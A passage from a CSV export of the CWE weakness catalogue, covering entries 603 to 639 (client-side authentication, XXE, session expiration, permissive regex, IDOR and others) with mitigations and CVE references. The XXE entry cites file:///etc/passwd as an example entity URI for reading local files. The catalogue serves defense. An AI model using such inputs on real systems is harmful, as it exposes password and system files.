inputs could not be modified, such as cookies and hidden form fields.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2005-4206:DESCRIPTION:URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4206::REFERENCE:CVE-2008-2951:DESCRIPTION:An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2951::REFERENCE:CVE-2008-2052:DESCRIPTION:Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2052::REFERENCE:CVE-2020-11053:DESCRIPTION:Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601):LINK:https://www.cve.org/CVERecord?id=CVE-2020-11053::\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:38:ENTRY NAME:URl Redirector Abuse::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::178::,\"\",\n603,\"Use of Client-Side Authentication\",Base,Draft,\"A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.\",\"Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:602:VIEW ID:1000::NATURE:PeerOf:CWE ID:300:VIEW ID:1000::NATURE:PeerOf:CWE ID:656:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Do not rely on client side data. Always perform server side authentication.::\",\"::REFERENCE:CVE-2022-33139:DESCRIPTION:SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-33139::REFERENCE:CVE-2006-0230:DESCRIPTION:Client-side check for a password allows access to a server using crafted XML requests from a modified client.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-0230::\",,,\"\",,\"\",\n605,\"Multiple Binds to the Same Port\",Variant,Draft,\"When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.\",\"On most systems, a combination of setting the SO_REUSEADDR socket option, and a call to bind() allows any process to bind to a port to which a previous process has bound with INADDR_ANY. This allows a user to bind to the specific address of a server bound to INADDR_ANY on an unprivileged port, and steal its UDP packets/TCP connection.\",::NATURE:ChildOf:CWE ID:675:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:666:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:NOTE:Packets from a variety of network services may be stolen or the services spoofed.::\",\"\",\"::PHASE:Policy:DESCRIPTION:Restrict server socket address to known local addresses.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP32:ENTRY NAME:Multiple binds to the same port::\",,\"\",\n606,\"Unchecked Input for Loop Condition\",Base,Draft,\"The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.\",\"\",::NATURE:ChildOf:CWE ID:1284:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:834:VIEW ID:1000::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU)::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Do not use user-controlled data for loop conditions.::PHASE:Implementation:DESCRIPTION:Perform input validation.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-606::\",,\"\",\n609,\"Double-Checked Locking\",Base,Draft,\"The product uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.\",\"Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as it is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.\",::NATURE:ChildOf:CWE ID:667:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:367:VIEW ID:1000::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Alter Execution Logic::\",\"\",\"::PHASE:Implementation:DESCRIPTION:While double-checked locking can be achieved in some languages, it is inherently flawed in Java before 1.5, and cannot be achieved without compromising platform independence. Before Java 1.5, only use of the synchronized keyword is known to work. Beginning in Java 1.5, use of the volatile keyword allows double-checked locking to work successfully, although there is some debate as to whether it achieves sufficient performance gains. See references.::\",\"\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK10-J:ENTRY NAME:Do not use incorrect forms of the double-checked locking idiom::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP19:ENTRY NAME:Missing Lock::\",,\"\",\n611,\"Improper Restriction of XML External Entity Reference\",Base,Draft,\"The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.\",\"XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing. By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as file:///c:/winnt/win.ini designates (in Windows) the file C:Winntwin.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning. Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.\",::NATURE:ChildOf:CWE ID:610:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1003:ORDINAL:Primary::NATURE:PeerOf:CWE ID:441:VIEW ID:1000::,\"\",::LANGUAGE NAME:XML:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:XXE:DESCRIPTION:An acronym used for the term XML eXternal Entities::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Read Files or Directories:NOTE:If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.::SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:NOTE:The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):NOTE:The product could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation System Configuration:DESCRIPTION:Many XML parsers and validators can be configured to disable external entity expansion.::\",\"::REFERENCE:CVE-2022-42745:DESCRIPTION:Recruiter software allows reading arbitrary files using XXE:LINK:https://www.cve.org/CVERecord?id=CVE-2022-42745::REFERENCE:CVE-2005-1306:DESCRIPTION:A browser control can allow remote attackers to determine the existence of files via Javascript containing XML script.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1306::REFERENCE:CVE-2012-5656:DESCRIPTION:XXE during SVG image conversion:LINK:https://www.cve.org/CVERecord?id=CVE-2012-5656::REFERENCE:CVE-2012-2239:DESCRIPTION:XXE in PHP application allows reading the application's configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-2239::REFERENCE:CVE-2012-3489:DESCRIPTION:XXE in database server:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3489::REFERENCE:CVE-2012-4399:DESCRIPTION:XXE in rapid web application development framework allows reading arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-4399::REFERENCE:CVE-2012-3363:DESCRIPTION:XXE via XML-RPC request.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3363::REFERENCE:CVE-2012-0037:DESCRIPTION:XXE in office document product using RDF.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-0037::REFERENCE:CVE-2011-4107:DESCRIPTION:XXE in web-based administration tool for database.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-4107::REFERENCE:CVE-2010-3322:DESCRIPTION:XXE in product that performs large-scale data analysis.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3322::REFERENCE:CVE-2009-1699:DESCRIPTION:XXE in XSL stylesheet functionality in a common library used by some web browsers.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1699::\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:43:ENTRY NAME:XML External Entities::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::221::,\"::TYPE:Relationship:NOTE:CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the Server portion of the SSRF acronym does not necessarily apply.::\",\n613,\"Insufficient Session Expiration\",Base,Incomplete,\"According to WASC, Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\",\"\",::NATURE:ChildOf:CWE ID:672:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:672:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:287:VIEW ID:1000::,\"\",,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Set sessions/credentials expiration date.::\",\"\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:47:ENTRY NAME:Insufficient Session Expiration::\",,\"::TYPE:Other:NOTE:The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.::\",\n617,\"Reachable Assertion\",Base,Draft,\"The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.\",\"While assertion is good for catching logic errors and reducing the chances of reaching more serious vulnerability conditions, it can still lead to a denial of service. For example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.\",::NATURE:ChildOf:CWE ID:670:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:670:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",,\"\",\"::TERM:assertion failure::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:An attacker that can trigger an assert statement can still lead to a denial of service if the relevant code can be triggered by an attacker, and if the scope of the assert() extends beyond the attacker's own session.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Make sensitive open/close operation non reachable by directly user-controlled data (e.g. open/close resources)::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform input validation on user data.::\",\"::REFERENCE:CVE-2023-49286:DESCRIPTION:Chain: function in web caching proxy does not correctly check a return value (CWE-253) leading to a reachable assertion (CWE-617):LINK:https://www.cve.org/CVERecord?id=CVE-2023-49286::REFERENCE:CVE-2006-6767:DESCRIPTION:FTP server allows remote attackers to cause a denial of service (daemon abort) via crafted commands which trigger an assertion failure.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6767::REFERENCE:CVE-2006-6811:DESCRIPTION:Chat client allows remote attackers to cause a denial of service (crash) via a long message string when connecting to a server, which causes an assertion failure.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6811::REFERENCE:CVE-2006-5779:DESCRIPTION:Product allows remote attackers to cause a denial of service (daemon crash) via LDAP BIND requests with long authcid names, which triggers an assertion failure.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-5779::REFERENCE:CVE-2006-4095:DESCRIPTION:Product allows remote attackers to cause a denial of service (crash) via certain queries, which cause an assertion failure.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4095::REFERENCE:CVE-2006-4574:DESCRIPTION:Chain: security monitoring product has an off-by-one error that leads to unexpected length values, triggering an assertion.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4574::REFERENCE:CVE-2004-0270:DESCRIPTION:Anti-virus product has assert error when line length is non-numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0270::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MET01-J:ENTRY NAME:Never use assertions to validate method arguments::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"\",\n618,\"Exposed Unsafe ActiveX Method\",Variant,Incomplete,\"An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).\",\"ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.\",::NATURE:ChildOf:CWE ID:749:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:If you must expose a method, make sure to perform input validation on all arguments, and protect against all possible vulnerabilities.::PHASE:Architecture and Design:DESCRIPTION:Use code signing, although this does not protect against any weaknesses that are already in the control.::PHASE:Architecture and Design System Configuration:DESCRIPTION:Where possible, avoid marking the control as safe for scripting.::\",\"::REFERENCE:CVE-2007-1120:DESCRIPTION:download a file to arbitrary folders.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1120::REFERENCE:CVE-2006-6838:DESCRIPTION:control downloads and executes a url in a parameter:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6838::REFERENCE:CVE-2007-0321:DESCRIPTION:resultant buffer overflow:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0321::\",,,\"\",,\"\",\n619,\"Dangling Database Cursor ('Cursor Injection')\",Base,Incomplete,\"If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor dangling.\",\"For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.\",::NATURE:ChildOf:CWE ID:402:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary:DESCRIPTION:This could be primary when the programmer never attempts to close the cursor when finished with it.::ORDINALITY:Resultant::\",::LANGUAGE NAME:SQL:LANGUAGE PREVALENCE:Undetermined::,\"::A cursor is a feature in Oracle PL/SQL and other languages that provides a handle for executing and accessing the results of SQL queries.::\",\"\",\"::PHASE:Implementation:NOTE:This issue is currently reported for unhandled exceptions, but it is theoretically possible any time the programmer does not close the cursor at the proper time.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Close cursors immediately after access to them is complete. Ensure that you close cursors if exceptions occur.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n620,\"Unverified Password Change\",Base,Draft,\"When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.\",\"This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:When prompting for a password change, force the user to provide the original password in addition to the new password.::PHASE:Architecture and Design:DESCRIPTION:Do not use forgotten password functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided.::\",\"::REFERENCE:CVE-2007-0681:DESCRIPTION:Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0681::REFERENCE:CVE-2000-0944:DESCRIPTION:Web application password change utility doesn't check the original password.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0944::\",,,\"::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A3:ENTRY NAME:Broken Authentication and Session Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP31:ENTRY NAME:Missing authentication::\",,\"\",\n624,\"Executable Regular Expression Error\",Base,Incomplete,\"The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.\",\"Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Implementation:DESCRIPTION:The regular expression feature in some languages allows inputs to be quoted or escaped before insertion, such as Q and E in Perl.::\",\"::REFERENCE:CVE-2006-2059:DESCRIPTION:Executable regexp in PHP by inserting e modifier into first argument to preg_replace:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2059::REFERENCE:CVE-2005-3420:DESCRIPTION:Executable regexp in PHP by inserting e modifier into first argument to preg_replace:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3420::REFERENCE:CVE-2006-2878:DESCRIPTION:Complex curly syntax inserted into the replacement argument to PHP preg_replace(), which uses the /e modifier:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2878::REFERENCE:CVE-2006-2908:DESCRIPTION:Function allows remote attackers to execute arbitrary PHP code via the username field, which is used in a preg_replace function call with a /e (executable) modifier.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2908::\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"::TYPE:Research Gap:NOTE:Under-studied. The existing PHP reports are limited to highly skilled researchers, but there are few examples for other languages. It is suspected that this is under-reported for all languages. Usability factors might make it more prevalent in PHP, but this theory has not been investigated.::\",\n625,\"Permissive Regular Expression\",Base,Draft,\"The product uses a regular expression that does not sufficiently restrict the set of allowed values.\",\"This effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include: not identifying the beginning and end of the target string using wildcards instead of acceptable character ranges others\",::NATURE:ChildOf:CWE ID:185:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:187:VIEW ID:1000::NATURE:PeerOf:CWE ID:184:VIEW ID:1000::NATURE:PeerOf:CWE ID:183:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:This problem is frequently found when the regular expression is used in input validation or security features such as authentication.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:When applicable, ensure that the regular expression marks beginning and ending string patterns, such as /^string$/ for Perl.::\",\"::REFERENCE:CVE-2021-22204:DESCRIPTION:Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22204::REFERENCE:CVE-2006-1895:DESCRIPTION:.* regexp leads to static code injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-1895::REFERENCE:CVE-2002-2175:DESCRIPTION:insertion of username into regexp results in partial comparison, causing wrong database entry to be updated when one username is a substring of another.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2175::REFERENCE:CVE-2006-4527:DESCRIPTION:regexp intended to verify that all characters are legal, only checks that at least one is legal, enabling file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4527::REFERENCE:CVE-2005-1949:DESCRIPTION:Regexp for IP address isn't anchored at the end, allowing appending of shell metacharacters.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1949::REFERENCE:CVE-2002-2109:DESCRIPTION:Regexp isn't anchored to the beginning or end, which allows spoofed values that have trusted values as substrings.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2109::REFERENCE:CVE-2006-6511:DESCRIPTION:regexp in .htaccess file allows access of files whose names contain certain substrings:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6511::REFERENCE:CVE-2006-6629:DESCRIPTION:allow load of macro files whose names contain certain substrings.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6629::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS08-J:ENTRY NAME:Sanitize untrusted data passed to a regex::\",,\"\",\n628,\"Function Call with Incorrectly Specified Arguments\",Base,Draft,\"The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.\",\"There are multiple ways in which this weakness can be introduced, including: the wrong variable or reference; an incorrect number of arguments; incorrect order of arguments; wrong type of arguments; or wrong value.\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary:DESCRIPTION:This is usually primary to other weaknesses, but it can be resultant if the function's API or function prototype changes.::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:SCOPE:Access Control:IMPACT:Quality Degradation:IMPACT:Gain Privileges or Assume Identity:NOTE:This weakness can cause unintended behavior and can lead to additional weaknesses such as allowing an attacker to gain unintended access to system resources.::\",\"::METHOD:Other:DESCRIPTION:Since these bugs typically introduce incorrect behavior that is obvious to users, they are found quickly, unless they occur in rarely-tested code paths. Managing the correct number of arguments can be made more difficult in cases where format strings are used, or when variable numbers of arguments are supported.::\",\"::PHASE:Build and Compilation:DESCRIPTION:Once found, these issues are easy to fix. Use code inspection tools and relevant compiler features to identify potential violations. Pay special attention to code that is not likely to be exercised heavily during QA.::PHASE:Architecture and Design:DESCRIPTION:Make sure your API's are stable before you use them in production code.::\",\"::REFERENCE:CVE-2006-7049:DESCRIPTION:The method calls the functions with the wrong argument order, which allows remote attackers to bypass intended access restrictions.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-7049::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:DCL10-C:ENTRY NAME:Maintain the contract between the writer and caller of variadic functions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP37-C:ENTRY NAME:Call functions with the correct number and type of arguments:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:DCL00-PL:ENTRY NAME:Do not use subroutine prototypes:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP33-PL:ENTRY NAME:Do not invoke a function in a context for which it is not defined:MAPPING FIT:Imprecise::\",,\"\",\n639,\"Authorization Bypass Through User-Controlled Key\",Base,Incomplete,\"The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.\",\"Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system. For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value. One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.\",::NATURE:ChildOf:CWE ID:863:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:863:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:284:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Insecure Direct Object Reference / IDOR:DESCRIPTION:The Insecure Direct Object Reference term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.::TERM:Broken Object Level Authorization / BOLA:DESCRIPTION:BOLA is used in the 2019 OWASP API Security Top 10 and is said to be the same as IDOR.::TERM:Horizontal Authorization:DESCRIPTION:Horizontal Authorization is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to 